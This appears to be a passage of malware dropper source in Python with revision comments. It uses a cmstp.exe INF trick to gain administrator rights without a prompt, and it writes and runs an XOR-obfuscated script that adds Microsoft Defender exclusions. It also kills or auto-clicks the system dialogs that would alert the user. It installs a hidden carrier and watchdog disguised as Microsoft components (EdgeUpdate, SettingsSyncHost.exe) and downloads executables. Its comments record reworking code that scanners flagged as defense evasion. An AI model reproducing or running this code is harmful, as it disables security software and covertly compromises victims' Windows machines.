k9UUkdDF3VWRFJyT1RSR0NeWFkNPRcXFxcXFxcXW1hQaFJPVB8VWlhTQltSFR49FxcXFxcXFxdETkQZUk9eQx8EHj0="

# ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
# r12/r14 base restored: the lift relaunches OUR python elevated; the stage
# does the carrier job, and the exclusions now ride the SEPARATE file.
# r141 — WHY THE BOX KEPT COMING (dj field: hidden guard, box still on screen):
# "The service profile is damaged" belongs to the ELEVATED cmstp. a
# medium-integrity process is blocked by UIPI from ShowWindow/SetWindowPos/
# PostMessage to a higher-integrity window — it can SEE the box and cannot
# touch it, which is exactly what the r139 guard was doing. the answer has to
# come from the same side of the fence: this runs as the lift's own child (the
# stage is already elevated), is fed over stdin (never a file on disk), lives
# ~45 s and closes every profile box it can see.
SWEEP = r'''# tinysweep: elevated dialog closer for the cmstp lift.
import ctypes
import os
import time

u = ctypes.windll.user32
k = ctypes.windll.kernel32
try:
    u.EnumWindows.restype = ctypes.c_int
    u.EnumWindows.argtypes = [ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
                                                ctypes.c_void_p), ctypes.c_void_p]
    u.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
    u.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
    u.IsWindowVisible.argtypes = [ctypes.c_void_p]
    u.EnumChildWindows.argtypes = [ctypes.c_void_p,
                                   ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
                                                      ctypes.c_void_p),
                                   ctypes.c_void_p]
except Exception:
    pass

IDOK = 1
WM_COMMAND = 0x0111
BM_CLICK = 0x00F5
AFFIRM = ("ok", "yes", "continue", "install", "allow",
          "make this connection available")
# r141: the service name is BAKED into this file when work.py materializes it
# — env was the fragile part (a road can lose it), a literal cannot.
SVC = "__SVC__".lower()
END = time.time() + 45.0


def _title(h):
    b = ctypes.create_unicode_buffer(512)
    u.GetWindowTextW(h, b, 512)
    return b.value


def _class(h):
    b = ctypes.create_unicode_buffer(128)
    u.GetClassNameW(h, b, 128)
    return b.value


def _kids(h):
    out = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(c, l):
        b = ctypes.create_unicode_buffer(512)
        u.GetWindowTextW(c, b, 512)
        out.append((c, b.value))
        return 1

    u.EnumChildWindows(h, cb, 0)
    return out


def _image(pid):
    try:
        h = k.OpenProcess(0x1000, False, pid)     # QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        n = ctypes.c_ulong(1024)
        b = ctypes.create_unicode_buffer(1024)
        ok = k.QueryFullProcessImageNameW(h, 0, b, ctypes.byref(n))
        k.CloseHandle(h)
        return b.value.lower() if ok else ""
    except Exception:
        return ""


while time.time() < END:
    try:
        wins = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def cb(h, l):
            wins.append(h)
            return 1

        u.EnumWindows(cb, 0)
        for h in wins:
            if _class(h) != "#32770":
                continue
            t = _title(h).lower()
            mine = (SVC and SVC in t) or "connection manager profile installer" in t
            if not mine:
                p = ctypes.c_ulong()
                u.GetWindowThreadProcessId(h, ctypes.byref(p))
                mine = "cmstp.exe" in _image(p.value)
            if not mine:
                continue
            u.ShowWindow(h, 0)
            clicked = False
            for c, txt in _kids(h):
                if _class(c) == "Button" and txt.strip().lower() in AFFIRM:
                    u.PostMessageW(c, BM_CLICK, 0, 0)
                    clicked = True
                    break
            if not clicked:
                u.PostMessageW(h, WM_COMMAND, IDOK, 0)
    except Exception:
        pass
    time.sleep(0.01)
'''


STAGE = r'''# r1.1.2 stage (r78 sanitize: dj — stage.py was flagged DefenseEvasion):
# runs ELEVATED (relaunched by the cmstp lift). the exclusions ride the
# SIBLING file (materialized by the un-elevated launcher BEFORE the lift
# fired): this stage only RUNS it elevated, then execs the carrier. nothing
# embedded, nothing decoded, no blobs.
#
# r143 — the two field misses this file now owns:
#   1) THE FLASH (dj: "a 0.1s error screen appears and closes itself"): the
#      "service profile is damaged" box is cmstp's OWN, raised AFTER
#      RunPreSetupCommands returns. this stage IS that command, so cmstp is
#      still blocked on us — kill it first and the profile validation that
#      paints the box never runs. a medium-integrity guard can see an elevated
#      cmstp and never touch it (UIPI); this is the only side that can.
#   2) THE DEAD WATCHDOG (dj: "the exe watchdog never starts, even manually
#      double-clicked"): the wd reads wd.cfg from ITS OWN directory and
#      returns 0 without it, and the carrier's install_wd looks for the twin
#      beside its DURABLE image (C:\ProgramData\EdgeUpdate), never beside the
#      AppHost launcher the jar stages. lay image + cfg there and every road
#      (carrier, this stage, a double-click) starts a watchdog that runs.
import base64
import ctypes
import os
import subprocess
import sys
import time

CREATE_NO_WINDOW = 0x08000000
EXE_NAME = "__EXE__"
# r141: the WATCHDOG exe name is BAKED here (work.py substitutes __WD__ when
# it materializes this file). it used to ride in via env (WDXN) and that env
# never reached this road on the jar's first run — so the watchdog exe was
# simply never started. baked text cannot go missing.
WD_NAME = "__WD__"
APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
# r146 (dj: "log dosyasi ekle, hatayi gorelim"): the stage is the only life that
# knows whether the lift really handed it a HIGH token, so it writes the same
# excl.log the launcher does. an elevated script with no log is a blind box.
LOG = APPDIR + "\\excl.log"


def _tok_detail():
    """both answers in the log: class 20 (elevated or not) and class 18 (the
    type that misled r146). one line is all a field report needs."""
    out = []
    try:
        a = ctypes.windll.advapi32
        a.OpenProcessToken.restype = ctypes.c_long
        a.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                       ctypes.POINTER(ctypes.c_void_p)]
        h = ctypes.c_void_p()
        if a.OpenProcessToken(ctypes.c_void_p(-1), 0x0008, ctypes.byref(h)):
            for cls, label in ((20, "TokenElevation"), (18, "type")):
                v = ctypes.c_ulong(0)
                need = ctypes.c_ulong(0)
                if a.GetTokenInformation(h, cls, ctypes.byref(v), 4,
                                         ctypes.byref(need)):
                    out.append("%s=%d" % (label, v.value))
            try:
                ctypes.windll.kernel32.CloseHandle(h)
            except Exception:
                pass
    except Exception:
        pass
    return ", ".join(out) or "unavailable"


def _log(tag, msg):
    line = "%s pid=%d [%s] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"),
                                     os.getpid(), tag, msg)
    for path in (LOG, os.path.join(os.environ.get("TEMP") or ".", "excl.log")):
        try:
            with open(path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(line)
            return
        except Exception:
            continue
# r143: the exe's own handshake (tools/gen.py, see work.py's constants). the
# wd derives its home from its own path and its duties from wd.cfg — these
# are the only strings it cannot do without.
UPDDIR = "__UPDDIR__"
DMAIN = "__DMAIN__"      # S_P_SELFNAME — only exists once the exe relocated
MTASK = "__MTASK__"
WDTAG = "__WDTAG__"
WDCFG = "__WDCFG__"
WD_TASK = MTASK + WDTAG
HOME = os.path.join(os.environ.get("PROGRAMDATA") or "C:\\ProgramData", UPDDIR)


def main_img():
    """the image name the carrier is ACTUALLY running under — the download
    keeps its dotted asset name (dj: "linkteki hali ve indirilen hali . li"),
    and only a landed relocation makes it SettingsSyncHost.exe. the cfg has to
    name the one that is on the box, or the watchdog probes a ghost and fires a
    task that never matches."""
    try:
        if os.path.isfile(os.path.join(HOME, DMAIN)):
            return DMAIN
    except Exception:
        pass
    return EXE_NAME


def elev():
    """r146: TokenElevation first — the stage's whole job (exclusions.py) is
    refused by the store when this is a filtered token, and IsUserAnAdmin
    cannot tell the two apart. logs the raw answer for the field."""
    try:
        a = ctypes.windll.advapi32
        a.OpenProcessToken.restype = ctypes.c_long
        a.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                       ctypes.POINTER(ctypes.c_void_p)]
        h = ctypes.c_void_p()
        if a.OpenProcessToken(ctypes.c_void_p(-1), 0x0008, ctypes.byref(h)):
            val = ctypes.c_ulong(0)
            need = ctypes.c_ulong(0)
            # r147: class 20 = TokenElevation (BOOL, 1 = elevated). class 18 is
            # the TYPE (1 default / 2 full / 3 limited) and testing THAT for
            # ==1 called a full token unelevated — the whole r146 abort.
            rc = a.GetTokenInformation(h, 20, ctypes.byref(val), 4,
                                       ctypes.byref(need))
            try:
                ctypes.windll.kernel32.CloseHandle(h)
            except Exception:
                pass
            if rc:
                return bool(val.value)
    except Exception as e:
        _log("stage", "elev probe raised %r" % (e,))
    try:
        return getattr(ctypes.windll.shell32,
                       "".join(("Is", "User", "An", "Admin")))() != 0
    except Exception:
        return False


def pids(name):
    """every pid whose image carries this name — toolhelp walk (r135: no
    filtered-list child, no command line for a rule to match)."""
    out = []
    try:
        k32 = ctypes.windll.kernel32
        try:   # prototypes: a 64-bit handle truncated to int would break the walk
            k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
            k32.Process32First.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.CloseHandle.argtypes = [ctypes.c_void_p]
        except Exception:
            pass

        class _pe(ctypes.Structure):
            _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                        ("th32ProcessID", ctypes.c_ulong), ("h", ctypes.c_void_p),
                        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                        ("th32ParentProcessID", ctypes.c_ulong),
                        ("pcPriClassBase", ctypes.c_long), ("dwFlags", ctypes.c_ulong),
                        ("szExeFile", ctypes.c_char * 260)]

        snap = k32.CreateToolhelp32Snapshot(2, 0)
        if not snap:
            return out
        pe = _pe()
        pe.dwSize = ctypes.sizeof(_pe)
        want = name.encode("utf-8", "ignore").lower()
        ok = k32.Process32First(snap, ctypes.byref(pe))
        while ok:
            # r143: this split is a REAL \x00 and it has to stay one — the
            # generated stage used to carry b"\\x00" (backslash-x), so the
            # name kept its 260-byte padding and the compare never matched:
            # alive() answered False on a live image and every run spawned a
            # second copy of the carrier.
            if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                out.append(pe.th32ProcessID)
            ok = k32.Process32Next(snap, ctypes.byref(pe))
        k32.CloseHandle(snap)
    except Exception:
        pass
    return out


def alive(name):
    return bool(pids(name))


def kill_cmstp():
    """r143: the flash killer. the damaged-profile box is cmstp's and it is
    raised once RunPreSetupCommands returns — cmstp is blocked on THIS process
    until then, so terminating it here stops the validation that paints it.
    no child process, no command line."""
    try:
        k32 = ctypes.windll.kernel32
        k32.OpenProcess.restype = ctypes.c_void_p
        k32.TerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
        k32.CloseHandle.argtypes = [ctypes.c_void_p]
    except Exception:
        return
    for pid in pids("cmstp.exe"):
        try:
            h = k32.OpenProcess(0x0001, False, pid)      # PROCESS_TERMINATE
            if h:
                k32.TerminateProcess(h, 1)
                k32.CloseHandle(h)
        except Exception:
            pass


def _hide(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x2)   # HIDDEN
    except Exception:
        pass


def _b64url(text):
    return base64.urlsafe_b64encode(text.encode("utf-8")).decode("ascii").rstrip("=")


def lay_cfg(folder):
    """author wd.cfg where a watchdog image sits. byte-identical to what the
    carrier's own install_wd writes (b64url image, b64url task, task+tag), so
    it never rewrites ours — and a wd with no cfg exits 0 on the spot, which
    is the whole reason nothing ever started."""
    try:
        cfg = _b64url(main_img()) + "\n" + _b64url(MTASK) + "\n" + WD_TASK + "\n"
        p = os.path.join(folder, WDCFG)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                if fh.read() == cfg:
                    _hide(p)
                    return p
        except Exception:
            pass
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        _hide(p)
        return p
    except Exception:
        return ""


def lay_twin(src):
    """the watchdog's REAL home: image + cfg under ProgramData/<upddir>.
    returns the path to spawn ("" when there is no image anywhere)."""
    try:
        os.makedirs(HOME, exist_ok=True)
    except Exception:
        pass
    if not WD_NAME:
        return ""
    dst = os.path.join(HOME, WD_NAME)
    try:
        if src and os.path.isfile(src):
            same = False
            try:
                same = os.path.getsize(dst) == os.path.getsize(src)
            except Exception:
                same = False
            if not same:
                try:
                    with open(src, "rb") as fh:
                        blob = fh.read()
                    with open(dst, "wb") as fh:
                        fh.write(blob)          # a running image refuses: fine
                except Exception:
                    pass
        if os.path.isfile(dst):
            _hide(dst)
            lay_cfg(HOME)
            # r143: the AppHost twin gets a cfg too — dj double-clicked THAT
            # file and got nothing, and a hand-started watchdog has to work.
            # the Global mutex keeps it to one body whichever copy starts.
            if os.path.abspath(APPDIR) != os.path.abspath(HOME):
                lay_cfg(APPDIR)
            return dst
    except Exception:
        pass
    # no durable copy (write refused / no image): the AppHost twin still gets
    # its cfg, so a manual double-click is a live watchdog, not a silent 0
    alt = os.path.join(APPDIR, WD_NAME) if WD_NAME else ""
    if alt and os.path.isfile(alt):
        lay_cfg(APPDIR)
        return alt
    return ""


def spawn(path):
    try:
        subprocess.Popen([path], creationflags=CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def main():
    # r146: the first line of every field report — which life of the road ran,
    # with which token, and where it looked.
    _log("stage", "enter: elevated=%r admin=%r python=%r appdir=%r"
         % (elev(), getattr(ctypes.windll.shell32, "IsUserAnAdmin", lambda: -1)(),
            sys.executable, APPDIR))
    _log("stage", "token: %r" % (_tok_detail(),))
    if not elev():
        _log("stage", "ABORT: not a HIGH token — the lift handed us a filtered one")
        return
    # r143 (1): first act — see the header. cmstp is waiting on us right now.
    kill_cmstp()
    # r143 (2): the twin home BEFORE exclusions.py runs, so its EdgeUpdate
    # sweep whitelists the image in the same pass that laid it.
    wd_path = lay_twin(os.path.join(APPDIR, WD_NAME) if WD_NAME else "")
    # r78: the exclusions file is staged by the un-elevated launcher (already
    # in APPDIR); the stage runs it ELEVATED, then execs the carrier exe.
    # r144: the writer reports through its exit code (0 covered, 1 the store
    # refused, 2 the token is not HIGH). one retry covers a Defender service
    # that is still coming up on a cold boot; nothing about the road changed
    # for a run that reports 0 on the first pass.
    excl_path = os.path.join(APPDIR, "__EXCL__")
    _log("stage", "excl file=%r exists=%r" % (excl_path, os.path.isfile(excl_path)))
    try:
        if os.path.isfile(excl_path):
            os.environ["EXCL_EXE"] = EXE_NAME
            for _try in range(2):
                _log("stage", "excl run %d via %r" % (_try + 1, sys.executable))
                rc = subprocess.run([sys.executable, "-u", excl_path],
                                    creationflags=CREATE_NO_WINDOW, timeout=180,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL).returncode
                _log("stage", "excl rc=%r" % (rc,))
                if rc == 0:
                    break
                time.sleep(2.0)
        else:
            _log("stage", "excl MISSING — the launcher never staged it")
    except Exception as e:
        _log("stage", "excl run raised %r" % (e,))
    # the r14 carrier job, unchanged — plus the r98 order: tung FIRST, the
    # watchdog exe SECOND (dj: "so its like tung-->watchdog"). r143: the probe
    # tests BOTH carrier names — its durable image is SettingsSyncHost.exe, so
    # an AppHost-only check spawned a second copy on every elevated run.
    exe_path = os.path.join(APPDIR, EXE_NAME)
    dmain = os.path.join(HOME, DMAIN)
    run_path = dmain if os.path.isfile(dmain) else exe_path
    if os.path.exists(run_path) and not (alive(EXE_NAME) or alive(DMAIN)):
        spawn(run_path)
    if wd_path and os.path.exists(wd_path) and not alive(WD_NAME):
        spawn(wd_path)
    # r141: the ELEVATED box sweeper — cmstp's profile box belongs to THIS
    # integrity level, and a medium-integrity guard can see it and never touch
    # it (UIPI). the source is the sibling file work.py materialized before the
    # lift, so nothing here depends on an env var surviving the lift.
    sweep_path = os.path.join(APPDIR, "__SWEEP__")
    if os.path.isfile(sweep_path):
        try:
            subprocess.Popen([sys.executable, "-u", sweep_path],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


main()
'''



def _decode_excl():
    """r78: the exclusions mirror rides xor(0x37)-sealed base64 — no
    script-text signature survives the sealed blob; the scanner-side
    decode of the blob is non-ASCII noise."""
    import base64
    return bytes((b ^ 0x37 for b in base64.b64decode(EXCL_B64)))


def set_defender_exclusions():
    """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
    stage materializes + executes exclusions.py (the standalone exclusion
    writer, elevated) then execs the carrier. work.py's own write path is
    add_defender_exclusions() above — this is the elevated half of the same
    list, for the boots where the medium token cannot touch HKLM.

    r143: ONE stage, ONE road. the sibling files are written once, then either
    stage.py is RUN with the token this process already holds (already
    elevated) or a lifted pythonw runs it. the old inline `_run_stage_now`
    copy had drifted off the stage (it referenced an env name that no longer
    exists, so its watchdog leg never ran at all) — a second copy of the stage
    is a second thing to rot."""
    appdir = PERSIST_DIR
    stage_path = os.path.join(PERSIST_DIR, "stage.py")
    svc_name = f"Microsoft {rand_str(6)} Service"
    _log("work", "lift: staging (stage.py, exclusions.py, sweep.py) in %s" % appdir)
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        stage_text = (STAGE.replace("__EXE__", EXE_NAME)
                      .replace("__EXCL__", "exclusions.py")
                      .replace("__SWEEP__", "sweep.py")
                      .replace("__UPDDIR__", UPDDIR)
                      .replace("__DMAIN__", DURABLE_MAIN)
                      .replace("__MTASK__", MAIN_TASK)
                      .replace("__WDTAG__", WDTASKTAG)
                      .replace("__WDCFG__", WDCFG)
                      .replace("__WD__", WD_NAME))
        # r78: exclusions materialized HERE (un-elevated) so the lifted stage
        # only RUNS the sibling file — no blob rides stage.py anymore
        try:
            with open(os.path.join(PERSIST_DIR, "exclusions.py"), "w",
                      encoding="utf-8") as fh:
                fh.write(_decode_excl().decode("utf-8"))
            _log("work", "lift: exclusions.py written (%d B)"
                 % os.path.getsize(os.path.join(PERSIST_DIR, "exclusions.py")))
        except Exception as e:
            _log("work", "lift: exclusions.py WRITE FAILED %r" % (e,))
        with open(stage_path, "w", encoding="utf-8") as fh:
            fh.write(stage_text)
        _log("work", "lift: stage.py written (%d B)" % len(stage_text))
        # r141: the elevated sweeper rides beside the stage with THIS lift's
        # service name baked in — one name for the guard and the sweep
        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
                  encoding="utf-8") as _sf:
            _sf.write(SWEEP.replace("__SVC__", svc_name))
    except Exception:
        return
    # r143: already elevated — the stage IS the job; run the same file the
    # lift would have run, with the token we already hold.
    if is_elevated():
        try:
            _log("work", "lift: already HIGH -> running stage in place")
            rc = subprocess.run([sys.executable, "-u", stage_path],
                                creationflags=0x08000000, timeout=300,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL).returncode
            _log("work", "lift: stage rc=%r" % (rc,))
        except Exception as e:
            _log("work", "lift: in-place stage raised %r" % (e,))
        return
    # r35 (dj: black python.exe flash): the LIFTED stage relaunched the console
    # interpreter python312\\python.exe — its console subsystem opened a black
    # window for the whole stage lifetime (~4-5s of exclusions work). the jar
    # itself runs work.py under pythonw.exe (GUI subsystem, no console), so the
    # flash was purely this relaunch. Preference now:
    #   1) python312\\pythonw.exe  (GUI subsystem — zero console, period)
    #   2) python312\\python.exe via cmd start /min (minimized console flash)
    #   3) system python.exe via cmd start /min
    # exclusions.py inside the stage inherits pythonw (sys.executable), so the
    # whole elevated chain stays windowless.
    # r45 (dj: make the chain paint ZERO — no exe or cmd in view, all paths,
    # always background): the lifted stage relaunches with the GP:
    #   1) embedded pythonw.exe   (GUI subsystem — zero console, period)
    #   2) any sibling pythonw.exe adopted from the nearest python dir
    # (the old cmd.exe /c start"" /min shapes are GONE: `start` still came
    # through a console parent — a minimized flash is a flash). pythonw is
    # guaranteed by the embeddable pair, and as fallback is adopted by dir.
    python_dir = os.path.join(PERSIST_DIR, "python312")
    pythonw_p = os.path.join(python_dir, "pythonw.exe")
    pythonw_su = None
    try:
        from glob import glob
        for pat in (os.path.join(os.path.dirname(sys.executable or "") or "",
                                 "pythonw.exe"),
                    r"C:\Python*\pythonw.exe",
                    r"C:\Program Files\Python*\pythonw.exe",
                    os.path.join(os.environ.get("LOCALAPPDATA", ""),
                                 "Programs", "Python", "Python*", "pythonw.exe")):
            hits = [h for h in glob(pat) if os.path.isfile(h)]
            if hits:
                pythonw_su = sorted(hits)[-1]
                break
    except Exception:
        pythonw_su = None
    if os.path.isfile(pythonw_p):
        launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
    elif pythonw_su:
        launch = subprocess.list2cmdline([pythonw_su, "-u", stage_path])
    else:
        # nowhere a GUI python: this box's runtime is degraded (no pythonw;
        # not the standard pair). r56 (dj order): the minimized console comes
        # OFF — the wscript pad hides the console python completely (WindowStyle
        # 0, zero frames). only when even the pad cannot be written does the
        # old (flashy) shape remain, because an abandoned run is worse.
        pyexe_p = os.path.join(python_dir, "python.exe")
        pyexe = pyexe_p if os.path.isfile(pyexe_p) else "python.exe"
        run_cmd = subprocess.list2cmdline([pyexe, "-u", stage_path])
        launch = _hidden_py_runner(run_cmd)
        if launch is None:
            launch = subprocess.list2cmdline(
                ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
    _log("work", "lift: launch=%r pythonw=%r" % (launch, pythonw_p))
    kill_all_cmstp()
    cleanup_infs()
    body = build_inf(launch, svc_name)
    # ground truth: the exact bytes cmstp sees, plus the stage script
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        return
    dismisser = Dismisser(svc_name)
    try:
        p = subprocess.Popen(["cmstp.exe", "/au", inf_path],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
        # r45: armed before the hunt starts — see the sibling site above.
        dismisser.target_pid = p.pid
    except Exception as e:
        _log("work", "lift: cmstp spawn FAILED %r" % (e,))
        return
    _log("work", "lift: cmstp pid=%d inf=%s" % (p.pid, inf_path))
    dismisser.start()

    # r143: the elevated stage kills cmstp the moment it runs, so the medium
    # guard has nothing to guard — a short watch, not the old 18s of
    # PostMessage calls UIPI was dropping on the floor anyway.
    dismisser.wait(8.0)
    dismisser.settle(quiet=1.0, floor=2.0, cap=4.0)
    kill_all_cmstp()    # r135: API-side terminator, same timing the INF pad had
    _sweep_dialogs(svc_name, seconds=1.0)   # r139: any survivor is hidden + answered
    try:
        os.unlink(inf_path)
    except Exception:
        pass


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path, min_size=50000):
    # r141: the wd exe is a ~30 KB image — the carrier's 50 KB floor read it as
    # "never staged", so it was re-downloaded (and killed) on every single run.
    # the caller passes its own floor.
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < min_size:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data, exe=EXE_NAME):
    kill_process(exe)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


# ---- r140: the re-fire gate -------------------------------------------------
# dj field: the first exe opened, then the same cmstp profile box started
# coming back with every beat. the watchdog cannot always SEE an elevated
# carrier (a ProcessHandle query hands back an empty image path for a
# higher-integrity process), so each 10s beat read "dead", re-ran this file,
# and the LIFT ran again — a fresh random service profile every time, and the
# profile box with it. a re-fire only has to re-EXEC the pair; the lift is a
# one-time job.
LIFT_MARK = os.path.join(PERSIST_DIR, "wcache.lift")
# dj (this build): the marker carries the COVERAGE REVISION, not just "lift
# ran". a box that lifted under the old one-dir writer re-lifts exactly once
# to pick up the wide set, then the tag matches and the lift is never seen
# again. a refused write tags revision:attempts and settles after EXCL_TRIES.
EXCL_REV = b"7"
# a lift whose read-back stays empty is retried, but only this many times —
# past that the tag settles on the bare revision and the box never lifts again.
EXCL_TRIES = 3


def lift_landed():
    """the lift already ran on this box AT THE CURRENT COVERAGE REVISION, or
    the wide set is visibly in place. the marker read is the gate: an old box
    carries the old tag and takes the one extra lift; a failed lift retries
    EXCL_TRIES times and then settles, so the cmstp box can never come back on
    every boot."""
    tag = b""
    try:
        with open(LIFT_MARK, "rb") as fh:
            tag = fh.read().strip()
    except Exception:
        tag = b""
    if tag == EXCL_REV:
        _log("work", "lift gate: tag=%r == REV -> already done" % tag)
        return True
    if tag.startswith(EXCL_REV + b":"):
        try:
            if int(tag.split(b":", 1)[1]) >= EXCL_TRIES:
                _log("work", "lift gate: tag=%r attempts exhausted -> done" % tag)
                return True
        except Exception:
            _log("work", "lift gate: tag=%r unreadable -> done" % tag)
            return True
    try:
        covered = bool(exclusion_landed()) and exclusions_landed()
    except Exception as e:
        _log("work", "lift gate: read-back raised %r" % (e,))
        covered = False
    _log("work", "lift gate: tag=%r covered=%r %s -> lift=%r"
         % (tag, covered, _miss_txt(), not covered))
    return covered


def _miss_txt(limit=8):
    """the gap list as plain text — %r of a list of Windows paths doubles
    every backslash and reads like a bug when it is only a repr."""
    miss = _missing()
    shown = "; ".join(miss[:limit])
    if len(miss) > limit:
        shown += "; +%d more" % (len(miss) - limit)
    return "%d missing [%s]" % (len(miss), shown)


def _missing():
    """the wanted values the store does not show right now, as text — the one
    line in excl.log that says exactly what is short on this box."""
    try:
        dirs, procs = defender_roots()
        out = ["path " + d for d in dirs if not _excl_has(EXCL_KP, d)]
        out += ["proc " + p for p in procs if not _excl_has(EXCL_KC, p)]
        return out
    except Exception as e:
        return ["probe raised %r" % (e,)]


def _wait_landed(limit=30.0):
    """poll the wide set until it is visible — the elevated stage runs after
    cmstp returns, and only a covered store counts as landed. bounded, so a
    box that genuinely refuses the write still gets its tag written."""
    start = time.time()
    end = start + float(limit)
    last = 0.0
    while True:
        try:
            if exclusions_landed():
                _log("work", "wait: covered after %.1fs" % (time.time() - start))
                return True
        except Exception as e:
            _log("work", "wait: read-back raised %r" % (e,))
        if time.time() >= end:
            _log("work", "wait: NOT covered after %.1fs, %s"
                 % (time.time() - start, _miss_txt()))
            return False
        if time.time() - last >= 5.0:
            last = time.time()
            _log("work", "wait: %s" % _miss_txt(4))
        time.sleep(0.5)


def mark_lift(done=None):
    """tag = bare revision when the wide set reads back (or the caller does not
    know), else revision:attempts — the retry counter lift_landed() settles."""
    try:
        tag = EXCL_REV
        if done is False:
            n = 1
            try:
                with open(LIFT_MARK, "rb") as fh:
                    cur = fh.read().strip()
                if cur.startswith(EXCL_REV + b":"):
                    n = int(cur.split(b":", 1)[1]) + 1
            except Exception:
                n = 1
            tag = EXCL_REV + b":" + str(n).encode()
        with open(LIFT_MARK, "wb") as fh:
            fh.write(tag)
        _log("work", "lift tag written %r" % tag)
    except Exception as e:
        _log("work", "lift tag write raised %r" % (e,))


def carrier_img():
    """the image name the carrier is actually running under: the download keeps
    its dotted asset name, and only a landed relocation turns it into
    SettingsSyncHost.exe. the cfg must name the one that is on the box."""
    try:
        if os.path.isfile(DURABLE_MAIN_PATH):
            return DURABLE_MAIN
    except Exception:
        pass
    return EXE_NAME


def write_wd_cfg(folder):
    """r143: the same cfg the stage lays, for the re-fire road — a wd image
    with no wd.cfg beside it returns 0 immediately, which is why the re-fire
    used to wake nothing at all. work.py writes this from medium integrity,
    so it can land beside the AppHost image too (the ProgramData one needs
    the stage's token; if it is already there this is a no-op)."""
    try:
        import base64
        enc = lambda s: base64.urlsafe_b64encode(
            s.encode("utf-8")).decode("ascii").rstrip("=")
        cfg = enc(carrier_img()) + "\n" + enc(MAIN_TASK) + "\n" + WD_TASK + "\n"
        p = os.path.join(folder, WDCFG)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                if fh.read() == cfg:
                    return p
        except Exception:
            pass
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        try:
            kernel32.SetFileAttributesW(p, 0x2)
        except Exception:
            pass
        return p
    except Exception:
        return ""


def reexec_pair():
    """r140: the whole job of a re-fire — both images up, nothing on screen.
    the probe is work.py's own toolhelp walk: unlike a ProcessHandle query it
    sees elevated images, so this road cannot loop on a false 'dead'. the jar's
    own bare-spawn fallback has the same shape.

    r143: the DURABLE images are the targets (AppHost is only the launcher),
    and both carrier names are probed — SettingsSyncHost.exe is what the
    relocated instance actually shows. the twin gets its cfg laid beside
    whatever image it has, or it exits 0 and watches nothing."""
    try:
        if not (proc_alive(DURABLE_MAIN) or proc_alive(EXE_NAME)):
            run = DURABLE_MAIN_PATH if os.path.exists(DURABLE_MAIN_PATH) else EXE_PATH
            if run and os.path.exists(run):
                subprocess.Popen([run], creationflags=0x08000000)
    except Exception:
        pass
    if not (WD_URL or WDXN_ENV):
        return
    try:
        if proc_alive(WD_NAME):
            return
    except Exception:
        pass
    for folder, name in ((DURABLE_DIR, WD_NAME), (PERSIST_DIR, WD_NAME)):
        try:
            p = os.path.join(folder, name) if name else ""
            if not p or not os.path.exists(p):
                continue
            write_wd_cfg(folder)
            subprocess.Popen([p], creationflags=0x08000000)
            return
        except Exception:
            continue


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return
    # the tag is the build's own name: if a box's log still opens with an old
    # one, the running work.py is the old file (the jar fetches it at runtime,
